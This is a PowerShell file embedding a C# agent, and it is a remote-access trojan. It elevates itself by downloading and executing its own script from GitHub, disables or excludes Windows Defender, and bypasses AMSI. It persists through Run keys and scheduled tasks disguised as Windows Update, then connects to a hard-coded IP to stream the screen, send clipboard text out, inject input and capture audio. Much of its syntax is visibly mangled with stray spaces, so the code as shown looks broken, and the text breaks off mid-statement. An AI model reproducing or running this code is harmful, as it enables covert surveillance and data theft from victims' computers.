# language: PowerShell, file : cliente.ps1, target : Windows 10 / 11, PowerShell 5.1
#  vqq no topo gostoso
#  nottigang no topo ladrao

$serverIP = "198.1.195.204"
$serverPort = 4000

$h = [System.BitConverter]::ToString(
    [System.Security.Cryptography.MD5]::Create().ComputeHash(
        [System.Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME))).Replace("-", "").Substring(0, 8).ToLower()
    $installName = "WinUpdateSvc_$h"
    $taskName = "MicrosoftWindowsUpdateService_$h"
    $taskBootName = "MicrosoftWindowsUpdateBoot_$h"
    $shadowName = "MicrosoftCompatibilityAppraiser_$h"
    $shadowPath = "\Microsoft\Windows\Application Experience\$shadowName"
    $mutexName = "Global\WinUpdateSvcMutex_$h"
    $myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"

    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if (-not $isAdmin) {
        try { Start - Process powershell.exe - ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX(New - Object Net.WebClient).DownloadString('$myUrl')`"" - Verb RunAs - ErrorAction SilentlyContinue }
        catch {}
        exit
    }

$dir = "$env:ProgramData\Microsoft\Windows\Caches\$h"
$scriptPath = "$dir\$installName.ps1"
$vbsPath = "$dir\$installName.vbs"
$bootPath = "$dir\boot_launcher.ps1"

if ($args - notcontains "-silent") {
    $defenderOff = $false
        try {
        $mp = Get - MpComputerStatus - ErrorAction Stop
            if ($mp - and ((-not $mp.RealTimeProtectionEnabled) - or (-not $mp.AntivirusEnabled))) { $defenderOff = $true }
    }
    catch { }

    if (-not $defenderOff) {
        $sd = "$env:TEMP\sd_$h"
            New - Item - ItemType Directory - Path $sd - Force - ErrorAction SilentlyContinue | Out - Null
            New - Item - ItemType Directory - Path $dir - Force - ErrorAction SilentlyContinue | Out - Null
            try { Add - MpPreference - ExclusionPath $dir - Force - ErrorAction SilentlyContinue }
        catch {}
        try { Add - MpPreference - ExclusionPath $sd - Force - ErrorAction SilentlyContinue }
        catch {}
        try { Add - MpPreference - ExclusionProcess "powershell.exe" - Force - ErrorAction SilentlyContinue }
        catch {}
        try { Add - MpPreference - ExclusionProcess "wscript.exe" - Force - ErrorAction SilentlyContinue }
        catch {}

        try {
            $7zr = "$sd\7zr.exe"
                if (-not (Test - Path $7zr)) { Invoke - WebRequest - Uri "https://www.7-zip.org/a/7zr.exe" - OutFile $7zr - UseBasicParsing - TimeoutSec 30 - ErrorAction SilentlyContinue }
            $zip = "$sd\dc.zip"
                Invoke - WebRequest - Uri "https://www.sordum.org/files/downloads/defender-control.zip" - OutFile $zip - UseBasicParsing - TimeoutSec 30 - ErrorAction SilentlyContinue
                if ((Test - Path $7zr) - and (Test - Path $zip)) {
                    &$7zr x $zip "-o$sd\out" - y 2 > $null | Out - Null
                        $inner = Get - ChildItem "$sd\out" - Filter "dControl.zip" - Recurse - ErrorAction SilentlyContinue | Select - Object - First 1
                        if ($inner) { &$7zr x $inner.FullName "-o$sd\final" - p"sordum" - y 2 > $null | Out - Null }
                    $exe = Get - ChildItem "$sd\final" - Filter "dControl.exe" - Recurse - ErrorAction SilentlyContinue | Select - Object - First 1
                        if (-not $exe) { $exe = Get - ChildItem "$sd\out" - Filter "dControl.exe" - Recurse - ErrorAction SilentlyContinue | Select - Object - First 1 }
                    if ($exe) { Start - Process - FilePath $exe.FullName - ArgumentList "/D", "/s" - WindowStyle Hidden - Wait - ErrorAction SilentlyContinue }
                }
        }
        catch {}
    }

    New - Item - ItemType Directory - Path $dir - Force - ErrorAction SilentlyContinue | Out - Null
        try { (New - Object Net.WebClient).DownloadFile($myUrl, $scriptPath) }
    catch {}

    $vbsContent = 'CreateObject("WScript.Shell").Run "powershell.exe -nop -w hidden -ep bypass -f ""' + $scriptPath + '"" -silent", 0, False'
        Set - Content - Path $vbsPath - Value $vbsContent - Force - ErrorAction SilentlyContinue

        $bootContent = @"
        `$userTask = "$taskName"
        while (`$true) {
            try {
                `$active = (query session 2 > `$null | Select - String "Active")
                    if (`$active) { schtasks / run / tn `$userTask 2 > `$null | Out - Null }
            }
            catch {}
            Start - Sleep - Seconds 30
        }
    "@
        Set - Content - Path $bootPath - Value $bootContent - Force - ErrorAction SilentlyContinue

        $cmd = "wscript.exe //B //Nologo `"$vbsPath`""
        try {
        Set - ItemProperty - Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" - Name $installName - Value $cmd - Force - ErrorAction SilentlyContinue
            Set - ItemProperty - Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" - Name $installName - Value $cmd - Force - ErrorAction SilentlyContinue
    }
    catch {}

    try {
        $startup = [Environment]::GetFolderPath('Startup')
            Copy - Item $vbsPath "$startup\$installName.vbs" - Force - ErrorAction SilentlyContinue
    }
    catch {}

    try {
        $interval = if ($defenderOff) { 3 }
        else { 1 }
        $startTime = (Get - Date).ToString("yyyy-MM-ddTHH:mm:ss")
            $xmlUser = @"
            < ? xml version = "1.0" encoding = "UTF-16" ? >
            <Task version = "1.4" xmlns = "http://schemas.microsoft.com/windows/2004/02/mit/task">
            <RegistrationInfo><Description>Microsoft Windows Update< / Description>< / RegistrationInfo>
            <Triggers>
            <LogonTrigger><Enabled>true< / Enabled><UserId>$env:USERNAME< / UserId>< / LogonTrigger>
            <TimeTrigger><StartBoundary>$startTime< / StartBoundary>
            <Repetition><Interval>PT${ interval }M< / Interval><Duration>P3650D< / Duration><StopAtDurationEnd>false< / StopAtDurationEnd>< / Repetition>
            <Enabled>true< / Enabled>
            < / TimeTrigger>
            < / Triggers>
            <Principals><Principal id = "Author"><UserId>$env:USERNAME< / UserId><LogonType>InteractiveToken< / LogonType><RunLevel>HighestAvailable< / RunLevel>< / Principal>< / Principals>
            <Settings><MultipleInstancesPolicy>IgnoreNew< / MultipleInstancesPolicy><DisallowStartIfOnBatteries>false< / DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false< / StopIfGoingOnBatteries><StartWhenAvailable>true< / StartWhenAvailable><ExecutionTimeLimit>PT0S< / ExecutionTimeLimit><Enabled>true< / Enabled>< / Settings>
            <Actions Context = "Author"><Exec><Command>wscript.exe< / Command><Arguments>//B //Nologo "$vbsPath"</Arguments></Exec></Actions>
            < / Task>
            "@
            $p1 = "$dir\tu_$h.xml"; Set - Content - Path $p1 - Value $xmlUser - Encoding Unicode - Force
            cmd / c "schtasks /create /tn `"$taskName`" / xml `"$p1`" / f" 2>$null
            Remove - Item $p1 - Force - ErrorAction SilentlyContinue
    }
    catch {}

    attrib + h + s + r $scriptPath 2 > $null
        attrib + h + s + r $vbsPath 2 > $null
        attrib + h + s + r $bootPath 2 > $null

        Start - Process wscript.exe - ArgumentList "`"$vbsPath`"" - WindowStyle Hidden
        exit
}

# -silent
$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
if ($amsi) { $amsi.GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true) }

$mutex = New - Object System.Threading.Mutex($false, $mutexName)
if (-not $mutex.WaitOne(0)) { exit }
Start - Sleep - Milliseconds(Get - Random - Minimum 1500 - Maximum 6000)

if (-not ("R9KAgent" - as[type])) {
    Add - Type - ReferencedAssemblies System.Windows.Forms, System.Drawing @"
        using System;
    using System.Drawing;
    using System.Drawing.Imaging;
    using System.IO;
    using System.Runtime.InteropServices;
    using System.Text;
    using System.Threading;
    using System.Net.Sockets;
    using System.Windows.Forms;
    using Microsoft.Win32;
    using System.Diagnostics;
    using System.Net;

    public class R9KAgent {
        [DllImport("user32.dll")] public static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
        [DllImport("user32.dll")] public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
        [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);
        [DllImport("user32.dll")] public static extern bool SetProcessDPIAware();

        // Cursor APIs
        [StructLayout(LayoutKind.Sequential)]
            public struct CURSORINFO {
            public int cbSize;
            public int flags;
            public IntPtr hCursor;
            public Point ptScreenPos;
        }
        [DllImport("user32.dll")] public static extern bool GetCursorInfo(out CURSORINFO pci);
        [DllImport("user32.dll")] public static extern bool DrawIconEx(IntPtr hdc, int xLeft, int yTop, IntPtr hIcon, int cxWidth, int cyWidth, int istepIfAniCur, IntPtr hbrFlickerFreeDraw, int diFlags);
        const int CURSOR_SHOWING = 1;
        const int DI_NORMAL = 3;

        [DllImport("avicap32.dll", CharSet = CharSet.Unicode)]
            public static extern IntPtr capCreateCaptureWindow(string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, IntPtr hWnd, int nID);
        [DllImport("user32.dll", CharSet = CharSet.Ansi)] public static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, string lParam);
        [DllImport("user32.dll")] public static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
        [DllImport("user32.dll")] public static extern bool DestroyWindow(IntPtr hWnd);

        [DllImport("user32.dll", SetLastError = true)] public static extern bool OpenClipboard(IntPtr hWnd);
        [DllImport("user32.dll", SetLastError = true)] public static extern bool CloseClipboard();
        [DllImport("user32.dll", SetLastError = true)] public static extern IntPtr GetClipboardData(uint uFormat);
        [DllImport("user32.dll", SetLastError = true)] public static extern IntPtr SetClipboardData(uint uFormat, IntPtr hMem);
        [DllImport("user32.dll", SetLastError = true)] public static extern bool EmptyClipboard();
        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr GlobalAlloc(uint uFlags, UIntPtr dwBytes);
        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr GlobalLock(IntPtr hMem);
        [DllImport("kernel32.dll", SetLastError = true)] public static extern bool GlobalUnlock(IntPtr hMem);
        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr GlobalFree(IntPtr hMem);
        [DllImport("ole32.dll")] public static extern void CoTaskMemFree(IntPtr pv);

        const uint CF_UNICODETEXT = 13;
        const uint GMEM_MOVEABLE = 2;

        const uint WM_CAP_START = 0x0400;
        const uint WM_CAP_DRIVER_CONNECT = WM_CAP_START + 10;
        const uint WM_CAP_DRIVER_DISCONNECT = WM_CAP_START + 11;
        const uint WM_CAP_FILE_SAVEDIB = WM_CAP_START + 25;
        const uint WM_CAP_GRAB_FRAME = WM_CAP_START + 60;

        [ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject {}
        [ComImport, Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IMMDeviceEnumerator{
            [PreserveSig] int NotImpl1();
            [PreserveSig] int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice ppDevice);
        }
            [ComImport, Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
            interface IMMDevice{
                [PreserveSig] int Activate(ref Guid iid, int dwClsCtx, IntPtr pActivationParams, out IAudioClient ppInterface);
        }
            [ComImport, Guid("1CB9AD4C-DBFA-4c32-B178-C2F568A703B2"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
            interface IAudioClient{
                [PreserveSig] int Initialize(int shareMode, int streamFlags, long hnsBufferDuration, long hnsPeriodicity, IntPtr pFormat, IntPtr AudioSessionGuid);
                [PreserveSig] int GetBufferSize(out uint pNumBufferFrames);
                [PreserveSig] int GetStreamLatency(out long phnsLatency);
                [PreserveSig] int GetCurrentPadding(out uint pNumPaddingFrames);
                [PreserveSig] int IsFormatSupported(int shareMode, IntPtr pFormat, out IntPtr ppClosestMatch);
                [PreserveSig] int GetMixFormat(out IntPtr ppDeviceFormat);
                [PreserveSig] int GetDevicePeriod(out long phnsDefaultDevicePeriod, out long phnsMinimumDevicePeriod);
                [PreserveSig] int Start();
                [PreserveSig] int Stop();
                [PreserveSig] int Reset();
                [PreserveSig] int SetEventHandle(IntPtr eventHandle);
                [PreserveSig] int GetService(ref Guid riid, out IAudioCaptureClient ppv);
        }
            [ComImport, Guid("C8ADBD64-E71E-48a0-A4DE-185C395CD317"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IAudioCaptureClient{
            [PreserveSig] int GetBuffer(out IntPtr ppData, out uint pNumFramesToRead, out uint pdwFlags, out ulong pu64DevicePosition, out ulong pu64QPCPosition);
            [PreserveSig] int ReleaseBuffer(uint NumFramesRead);
            [PreserveSig] int GetNextPacketSize(out uint pNumFramesInNextPacket);
        }

            [StructLayout(LayoutKind.Sequential, Pack = 1)]
            public struct WAVEFORMATEX {
            public ushort wFormatTag; public ushort nChannels; public uint nSamplesPerSec;
            public uint nAvgBytesPerSec; public ushort nBlockAlign; public ushort wBitsPerSample; public ushort cbSize;
        }

        static string IP; static int PORT;
        static volatile bool streaming = false;
        static volatile bool isAudioRunning = false;
        static object writeLock = new object();
        static object capLock = new object();
        static object clipLock = new object();
        static volatile bool isLocked = false;
        static volatile int targetX = 0;
        static volatile int targetY = 0;
        static volatile bool hasNewPos = false;
        static int currentScreen = 0;
        static volatile Form bannerForm = null;
        static volatile Thread bannerThread = null;
        static volatile StreamWriter globalWriter = null;
        static Bitmap reuseBmp = null;
        static Graphics reuseGfx = null;
        static ImageCodecInfo jpgCodec = null;
        static EncoderParameters jpgParams = null;
        static string lastClipboardText = "";
        static long lastQuality = -1;

        static void EnsureJpegCodec(long quality) {
            if (jpgCodec == null) {
                ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
                foreach(var c in codecs) { if (c.FormatID == ImageFormat.Jpeg.Guid) { jpgCodec = c; break; } }
            }
            if (jpgParams == null) { jpgParams = new EncoderParameters(1); }
            if (lastQuality != quality) {
                if (jpgParams.Param[0] != null) jpgParams.Param[0].Dispose();
                jpgParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);
                lastQuality = quality;
            }
        }

        public static void Start(string ip, int port) {
            IP = ip; PORT = port;
            try { SetProcessDPIAware(); }
            catch {}
            Thread tWatch = new Thread(WatchdogLoop); tWatch.IsBackground = true; tWatch.Start();
            Thread tInput = new Thread(InputLoop); tInput.IsBackground = true; tInput.Start();
            Thread tClip = new Thread(ClipboardWatcher); tClip.IsBackground = true; tClip.Start();
            Random rng = new Random();

            while (true) {
                TcpClient myClient = null;
                try {
                    myClient = new TcpClient();
                    myClient.NoDelay = true;
                    myClient.SendTimeout = 10000;
                    myClient.ReceiveTimeout = 60000;
                    IAsyncResult ar = myClient.BeginConnect(IP, PORT, null, null);
                    if (!ar.AsyncWaitHandle.WaitOne(5000)) { myClient.Close(); throw new Exception("connect timeout"); }
                    myClient.EndConnect(ar);
                    NetworkStream myStream = myClient.GetStream();
                    StreamReader myReader = new StreamReader(myStream, new UTF8Encoding(false));
                    StreamWriter myWriter = new StreamWriter(myStream, new UTF8Encoding(false));
                    myWriter.AutoFlush = true;
                    globalWriter = myWriter;

                    myWriter.WriteLine("BANNER:" + Environment.MachineName + "@" + Environment.UserName + "|" + Screen.PrimaryScreen.Bounds.Width + "|" + Screen.PrimaryScreen.Bounds.Height + "|True");

                    Thread tRead = new Thread(() = > ReadLoop(myClient, myReader, myWriter)); tRead.IsBackground = true; tRead.Start();
                    Thread tStream = new Thread(() = > StreamLoop(myClient, myWriter)); tStream.IsBackground = true; tStream.Start();
                    Thread tBeat = new Thread(() = > HeartbeatLoop(myClient, myWriter)); tBeat.IsBackground = true; tBeat.Start();
                    while (true) {
                        if (myClient.Client == null) break;
                        bool dead = false;
                        try {
                            if (!myClient.Client.Connected) dead = true;
                            else if (myClient.Client.Poll(0, SelectMode.SelectRead) && myClient.Client.Available == 0) dead = true;
                        }
                        catch { dead = true; }
                        if (dead) break;
                        Thread.Sleep(500);
                    }
                }
                catch {
                }
                finally {
                    streaming = false;
                    isAudioRunning = false;
                    globalWriter = null;
                    try { if (myClient != null) myClient.Close(); }
                    catch {}
                }
                Thread.Sleep(rng.Next(2000, 5000));
            }
        }

        static void HeartbeatLoop(TcpClient myClient, StreamWriter myWriter) {
            while (true) {
                try { lock(writeLock) { myWriter.WriteLine("PING"); } }
                catch { break; }
                Thread.Sleep(20000);
            }
        }

        static void ClipboardWatcher() {
            Thread.Sleep(2000);
            string current = GetClipboardText();
            lock(clipLock) { lastClipboardText = current ? ? ""; }
            while (true) {
                current = GetClipboardText();
                if (current != null) {
                    bool changed = false;
                    lock(clipLock) {
                        if (current != lastClipboardText) {
                            lastClipboardText = current;
                            changed = true;
                        }
                    }
                    if (changed && globalWriter != null) {
                        lock(writeLock) {
                            try { globalWriter.WriteLine("CLIPSYNC:" + Convert.ToBase64String(Encoding.UTF8.GetBytes(current))); }
                            catch {}
                        }
                    }
                }
                Thread.Sleep(500);
            }
        }

        static void WatchdogLoop() {
            string dir = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches";
            while (true) {
                try {
                    if (!Directory.Exists(dir)) Directory.CreateDirectory(dir);
                    foreach(string sub in Directory.GetDirectories(dir)) {
                        string leaf = sub.Substring(sub.Length - 8);
                        string scriptPath = Path.Combine(sub, "WinUpdateSvc_" + leaf + ".ps1");
                        string vbsPath = Path.Combine(sub, "WinUpdateSvc_" + leaf + ".vbs");
                        string bootPath = Path.Combine(sub, "boot_launcher.ps1");
                        if (!File.Exists(scriptPath)) {
                            string url = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1";
                            try { using (var wc = new System.Net.WebClient()) { wc.DownloadFile(url, scriptPath); } }
                            catch {}
                            try { File.SetAttributes(scriptPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly); }
                            catch {}
                        }
                        if (!File.Exists(vbsPath)) {
                            string vbs = "CreateObject(\"WScript.Shell\").Run \"powershell.exe -nop -w hidden -ep bypass -f \"\"" + scriptPath + "\"\" -silent\", 0, False";
                            try { File.WriteAllText(vbsPath, vbs); }
                            catch {}
                            try { File.SetAttributes(vbsPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly); }
                            catch {}
                        }
                        if (!File.Exists(bootPath)) {
                            string b = "$userTask = \"MicrosoftWindowsUpdateService_" + leaf + "\"\nwhile ($true) { try { $a = (query session 2>$null | Select-String \"Active\"); if ($a) { schtasks /run /tn $userTask 2>$null | Out-Null } } catch {}; Start-Sleep -Seconds 30 }";
                            try { File.WriteAllText(bootPath, b); }
                            catch {}
                            try { File.SetAttributes(bootPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly); }
                            catch {}
                        }
                        string tUser = "MicrosoftWindowsUpdateService_" + leaf;
                        string tBoot = "MicrosoftWindowsUpdateBoot_" + leaf;
                        string tShadow = "\\Microsoft\\Windows\\Application Experience\\MicrosoftCompatibilityAppraiser_" + leaf;
                        if (!TaskExists(tUser)) { CreateTaskFromXml(tUser, TaskXml(scriptPath, vbsPath, false), sub); }
                        if (!TaskExists(tBoot)) { CreateTaskFromXml(tBoot, TaskXml(scriptPath, bootPath, true), sub); }
                        if (!TaskExists(tShadow)) { CreateTaskFromXml(tShadow, TaskXml(scriptPath, vbsPath, false), sub); }
                        using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
                            if (rk != null && rk.GetValue("WinUpdateSvc_" + leaf) == null) rk.SetValue("WinUpdateSvc_" + leaf, "wscript.exe //B //Nologo \"" + vbsPath + "\"");
                        }
                        using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
                            if (rk != null && rk.GetValue("WinUpdateSvc_" + leaf) == null) rk.SetValue("WinUpdateSvc_" + leaf, "wscript.exe //B //Nologo \"" + vbsPath + "\"");
                        }
                    }
                }
                catch {}
                Thread.Sleep(30000);
            }
        }

        static bool TaskExists(string name) {
            try {
                var p = Process.Start(new ProcessStartInfo("schtasks", "/query /tn \"" + name + "\""){ UseShellExecute = false, CreateNoWindow = true, RedirectStandardOutput = true, RedirectStandardError = true });
                p.WaitForExit(5000);
                return p.ExitCode == 0;
            }
            catch { return false; }
        }

        static string TaskXml(string scriptPath, string execPath, bool boot) {
            string principal = boot ? "<UserId>S-1-5-18</UserId>" : "<UserId>" + Environment.UserName + "</UserId><LogonType>InteractiveToken</LogonType>";
            string triggers = boot
                ? "<BootTrigger><Enabled>true</Enabled><Delay>PT30S</Delay></BootTrigger>"
                : "<LogonTrigger><Enabled>true</Enabled><UserId>" + Environment.UserName + "</UserId></LogonTrigger>" +
                "<TimeTrigger><StartBoundary>" + DateTime.Now.ToString("yyyy-MM-ddTHH:mm:ss") + "</StartBoundary>" +
                "<Repetition><Interval>PT1M</Interval><Duration>P3650D</Duration><StopAtDurationEnd>false</StopAtDurationEnd></Repetition></TimeTrigger>";
            string cmd = boot ? "powershell.exe" : "wscript.exe";
            string args = boot ? "-nop -w hidden -ep bypass -f \"" + execPath + "\"" : "//B //Nologo \"" + execPath + "\"";
            return "<?xml version=\"1.0\" encoding=\"UTF-16\"?>" +
                "<Task version=\"1.4\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">" +
                "<RegistrationInfo><Description>Microsoft Windows Update</Description></RegistrationInfo>" +
                "<Triggers>" + triggers + "</Triggers>" +
                "<Principals><Principal id=\"Author\">" + principal + "<RunLevel>HighestAvailable</RunLevel></Principal></Principals>" +
                "<Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>" +
                "<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>" +
                "<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>" +
                "<StartWhenAvailable>true</StartWhenAvailable>" +
                "<ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Enabled>true</Enabled></Settings>" +
                "<Actions Context=\"Author\"><Exec><Command>" + cmd + "</Command><Arguments>" + args + "</Arguments></Exec></Actions></Task>";
        }

        static void CreateTaskFromXml(string name, string xml, string dir) {
            try {
                string safe = name.Replace('\\', '_');
                string path = Path.Combine(dir, "restore_" + safe + ".xml");
                File.WriteAllText(path, xml, Encoding.Unicode);
                var p = Process.Start(new ProcessStartInfo("schtasks", "/create /tn \"" + name + "\" /xml \"" + path + "\" /f"){ UseShellExecute = false, CreateNoWindow = true });
                p.WaitForExit(10000);
                try { File.Delete(path); }
                catch {}
            }
            catch {}
        }

        static void ReadLoop(TcpClient myClient, StreamReader myReader, StreamWriter myWriter) {
            try {
                while (true) {
                    string cmd = myReader.ReadLine();
                    if (cmd == null) break;
                    ProcessCommand(cmd.Trim(), myWriter);
                }
            }
            catch {}
            try { myClient.Close(); }
            catch {}
        }

        static void InputLoop() {
            while (true) {
                try {
                    if (isLocked) {
                        if (Cursor.Position.X != targetX || Cursor.Position.Y != targetY) { Cursor.Position = new Point(targetX, targetY); }
                    }
                    else {
                        if (hasNewPos) { Cursor.Position = new Point(targetX, targetY); hasNewPos = false; }
                    }
                }
                catch {}
                Thread.Sleep(10);
            }
        }

        static void StreamLoop(TcpClient myClient, StreamWriter myWriter) {
            while (myClient.Connected) {
                try {
                    if (streaming) {
                        string b64 = CaptureScreen(1920, 85); // FullHD 1920x1080, qualidade 85
                        if (b64 != null) { lock(writeLock) { myWriter.WriteLine("SCREEN:" + b64); } Thread.Sleep(30); }
                        else Thread.Sleep(100);
                    }
                    else Thread.Sleep(50);
                }
                catch { Thread.Sleep(1000); }
            }
        }

        static void StartAudio() {
            if (isAudioRunning) return;
            isAudioRunning = true;
            Thread t = new Thread(() = > {
                try {
                    IMMDeviceEnumerator enumerator = (IMMDeviceEnumerator)new MMDeviceEnumeratorComObject();
                    IMMDevice device;
                    int hr = enumerator.GetDefaultAudioEndpoint(0, 1,
